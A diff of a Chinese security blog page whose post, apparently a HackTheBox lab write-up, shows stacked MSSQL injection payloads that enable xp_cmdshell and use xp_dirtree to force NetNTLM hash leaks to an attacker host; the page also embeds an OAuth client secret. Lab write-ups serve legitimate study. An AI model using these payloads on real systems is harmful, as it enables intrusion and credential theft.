@@ -3,16 +3,23 @@
 <head>
   <meta charset="utf-8">
   
-  <title>Archives: 2020/4 | Twe1ve&#39;s Blog</title>
+  <title>MSSQL NTLM stealer | Twe1ve&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Twe1ve&#39;s Blog">
-<meta property="og:url" content="https://github.com/archives/2020/04/index.html">
+  <meta name="description" content="可窃取NTLM的漏洞及利用方式 利用原理MSSQL数据库通常也用来存储客户端的个人身份信息（PII），并且对更高级别的员工或执行人员产生最大的影响。利用低权限用户帐户，然后针对MSSQL的集成域身份验证重新使用该信息。 如果数据库接受域身份验证，则通过插入目标UNC路径来滥用本机db过程’xp_dirtree’访问该路径随后在responder侦听的445端口上回调给攻击者。如果成功，MSSQL服">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MSSQL NTLM stealer">
+<meta property="og:url" content="https://github.com/2020/04/26/MSSQL-NTLM-stealer/index.html">
 <meta property="og:site_name" content="Twe1ve&#39;s Blog">
+<meta property="og:description" content="可窃取NTLM的漏洞及利用方式 利用原理MSSQL数据库通常也用来存储客户端的个人身份信息（PII），并且对更高级别的员工或执行人员产生最大的影响。利用低权限用户帐户，然后针对MSSQL的集成域身份验证重新使用该信息。 如果数据库接受域身份验证，则通过插入目标UNC路径来滥用本机db过程’xp_dirtree’访问该路径随后在responder侦听的445端口上回调给攻击者。如果成功，MSSQL服">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://github.com/2020/04/26/MSSQL-NTLM-stealer/1.png">
+<meta property="og:image" content="https://github.com/2020/04/26/MSSQL-NTLM-stealer/2.png">
+<meta property="article:published_time" content="2020-04-26T05:24:48.000Z">
+<meta property="article:modified_time" content="2020-04-26T05:31:15.481Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/2020/04/26/MSSQL-NTLM-stealer/1.png">
   
     <link rel="icon" href="/images/icon.png">
   
@@ -113,115 +120,69 @@
       </div>
     </div>
     <!--主页上右部分-->
-    <section class="archive main-right flex1">
-  
-  
-    <section class="archive-category">
-      <h1 class="title">2020</h1>
-      <ul class="menu">
-        
-          <li>
-            <a href="/2020/04/26/%E8%B0%83%E7%94%A8API%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7/">调用API绕过杀软添加用户</a>
-            <span class="date">Apr 26, 2020</span>
-          </li>
-        
-          <li>
-            <a href="/2020/04/26/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">SSTI[服务器模板注入]</a>
-            <span class="date">Apr 26, 2020</span>
-          </li>
-        
-          <li>
-            <a href="/2020/04/26/MSSQL-NTLM-stealer/">MSSQL NTLM stealer</a>
-            <span class="date">Apr 26, 2020</span>
-          </li>
-        
-          <li>
-            <a href="/2020/04/26/mimikatz%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81%E5%B0%8F%E8%AE%B0/">mimikatz抓取密码小记</a>
-            <span class="date">Apr 26, 2020</span>
-          </li>
-        
-          <li>
-            <a href="/2020/04/26/%E5%86%85%E7%BD%91%E4%BD%BF%E7%94%A8smb%E6%97%A0%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C/">内网使用smb无文件执行</a>
-            <span class="date">Apr 26, 2020</span>
-          </li>
-        
-          <li>
-            <a href="/2020/04/26/shell%E4%B8%AD%E5%AE%9E%E7%8E%B0runas%E5%91%BD%E4%BB%A4/">shell中实现runas命令</a>
-            <span class="date">Apr 26, 2020</span>
-          </li>
-        
-          <li>
-            <a href="/2020/04/26/CSharp%E5%BA%95%E5%B1%82%E8%B0%83%E7%94%A8powershell%E8%BF%87%E6%9D%80%E8%BD%AF/">C#底层调用powershell过杀软</a>
-            <span class="date">Apr 26, 2020</span>
-          </li>
-        
-          <li>
-            <a href="/2020/04/26/C%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E8%BF%87%E6%9D%80%E8%BD%AF/">C内存加载过杀软</a>
-            <span class="date">Apr 26, 2020</span>
-          </li>
-        
-          <li>
-            <a href="/2020/04/26/incognito-Stealing-Windows-Access-Tokens/">incognito Stealing Windows Access Tokens</a>
-            <span class="date">Apr 26, 2020</span>
-          </li>
-        
-          <li>
-            <a href="/2020/04/26/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BAD-Recyle-Bin%E7%BB%84%E5%88%A9%E7%94%A8-Ldaps%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE/">域渗透之AD Recyle Bin组利用+Ldaps信息枚举</a>
-            <span class="date">Apr 26, 2020</span>
-          </li>
-        
-          <li>
-            <a href="/2020/04/26/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8BExchange%E6%8F%90%E6%9D%83/">域控提权之Exchange提权</a>
-            <span class="date">Apr 26, 2020</span>
-          </li>
-        
-          <li>
-            <a href="/2020/04/25/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8Bms14-068/">域控提权之ms14-068</a>
-            <span class="date">Apr 25, 2020</span>
-          </li>
-        
-          <li>
-            <a href="/2020/04/25/Kerberos%E8%AE%A4%E8%AF%81%E5%AD%A6%E4%B9%A0/">Kerberos认证学习</a>
-            <span class="date">Apr 25, 2020</span>
-          </li>
-        
-          <li>
-            <a href="/2020/04/25/%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E4%B9%8B%E6%BB%A5%E7%94%A8GGP/">域内提权之滥用GGP</a>
-            <span class="date">Apr 25, 2020</span>
-          </li>
-        
-          <li>
-            <a href="/2020/04/22/JuicyPotato%E6%8F%90%E6%9D%83/">JuicyPotato提权</a>
-            <span class="date">Apr 22, 2020</span>
-          </li>
-        
-          <li>
-            <a href="/2020/04/19/%E4%B8%80%E6%AC%A1%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E5%BC%95%E5%8F%91%E7%9A%84SQLMAP%E4%BF%AE%E6%94%B9%E4%B9%8B%E8%B7%AF/">一次注入实战引发的SQLMAP修改之路</a>
-            <span class="date">Apr 19, 2020</span>
-          </li>
-        
-          <li>
-            <a href="/2020/04/19/%E4%BB%8E%E4%B8%A4%E9%81%93%E9%9D%B6%E5%9C%BA%E9%A2%98%E7%9B%AE%E7%9C%8BXHR/">从两道靶场题目看XHR</a>
-            <span class="date">Apr 19, 2020</span>
-          </li>
-        
-          <li>
-            <a href="/2020/04/19/multi-ways-file-download/">multi-ways-file-download</a>
-            <span class="date">Apr 19, 2020</span>
-          </li>
-        
-          <li>
-            <a href="/2020/04/19/Rerverse-shell-Interactive-shell/">Rerverse_shell&amp;Interactive_shell</a>
-            <span class="date">Apr 19, 2020</span>
-          </li>
-        
-      </ul>
-    </section>
-  
-</section>
+    <div class="main-right flex1 flex flex-v">
+    <div class="article-content flex1">
+        <div class="article-content-container">
+            <div class="article-title row">
+                <div class="title">MSSQL NTLM stealer</div>
+                <div class=" other">
+                    <!--<i class="iconfont icon-iconfontordinaryliulan"></i> 56--> <i
+                        class="iconfont icon-shijian"></i>· Apr 26, 2020 ·</div>
+            </div>
+            <div class="article-message markdown-body">
+                <article class="text" v-highlight>
+                    <p><a href="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/" target="_blank" rel="noopener">可窃取NTLM的漏洞及利用方式</a></p>
+<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>MSSQL数据库通常也用来存储客户端的个人身份信息（PII），并且对更高级别的员工或执行人员产生最大的影响。<br>利用低权限用户帐户，然后针对MSSQL的集成域身份验证重新使用该信息。</p>
+<p>如果数据库接受域身份验证，则通过插入目标UNC路径来滥用本机db过程’xp_dirtree’访问该路径随后在responder侦听的445端口上回调给攻击者。如果成功，MSSQL服务帐户将进行身份验证并提供NetNTLM哈希</p>
+<h2 id="环境说明："><a href="#环境说明：" class="headerlink" title="环境说明："></a><strong>环境说明：</strong></h2><p><a href="https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1存在MSSQL" target="_blank" rel="noopener">https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1存在MSSQL</a> SQLi，发现高权限账户但无法读取密码</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><img src="1.png" alt=""></p>
+<p>默认情况ASP/MSSQL支持堆叠注入：</p>
+<p>常用的存储过程xp_cmdshell，它接收一个Windows命令，运行它并将结果以文本行的格式返回;验证是否可执行命令</p>
+<pre><code>https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1;EXEC xp_cmdshell &apos;ping -c 4 10.10.14.14&apos;-- -</code></pre><p>本地监听icmp没有信息返回，即说明没有权限执行或没有开启xp_cmdshell,（xp_cmdhsell默认是禁用的，尝试开启）；尝试开启：</p>
+<pre><code>http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1; EXEC sp_configure &apos;show advanced options&apos;, 1; EXEC sp_configure &apos;xp_cmdshell&apos;, 1; reconfigure with override; exec master..xp_cmdshell &apos;ping -n 10 10.10.14.14&apos; -- -</code></pre><p>master.dbo.xp_shell  替代 xp_shell尝试绕过， Failed</p>
+<p>猜测是没有权限的问题，<a href="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/" target="_blank" rel="noopener">想到xp_dirtree外带数据</a>：</p>
+<p>payload：</p>
+<pre><code>http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1;declare%20@q%20varchar(99);set%20@q=%27\\10.10.14.14\test%27;%20exec%20master.dbo.xp_dirtree%20@q%20--%20-</code></pre><p><img src="2.png" alt=""></p>
 
+                </article>
+            </div>
+            <div id="gitalk-container"></div>
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<style>
+    .hljs {
+        display: block !important;
+        overflow-x: auto !important;
+        background: #2b2b2b !important;
+        color: #f8f8f2 !important;
+        padding: .5em !important;
+    }
+</style>
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script>
+    var gitalk = new Gitalk({
+        clientID: '85810192d72d7f763a9a',
+        clientSecret: 'e9867192041e53ad9f4581db6e50bbe7373a090d',
+        repo: 'myblog',
+        owner: 'callmesoul',
+        admin: ['callmesoul'],
+        id: '', // Ensure uniqueness and length less than 50
+        distractionFreeMode: false // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+        </div>
+    </div>
+</div>
 
-
+<link href="https://cdn.bootcss.com/highlight.js/9.15.7/styles/a11y-dark.min.css" rel="stylesheet">
+<script src="https://cdn.bootcss.com/highlight.js/9.15.9/highlight.min.js"></script>
+<script>
+    document.addEventListener('DOMContentLoaded', (event) => {
+        document.querySelectorAll('pre code').forEach((block) => {
+            hljs.highlightBlock(block);
+        });
+    });
+</script>
   </div>
   <!--
   <div class="main-bottom">
